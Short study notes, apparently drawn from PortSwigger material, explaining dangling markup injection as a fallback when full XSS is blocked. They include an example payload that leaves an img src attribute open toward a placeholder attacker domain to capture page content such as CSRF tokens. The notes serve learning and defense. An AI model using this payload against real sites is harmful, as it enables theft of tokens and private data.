Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

Suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:
```html
"><img src='//attacker-website.com?
```
Note that the attacker's payload doesn't close the `src` attribute, which is left "dangling".
The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.

#to-be-continued 
https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack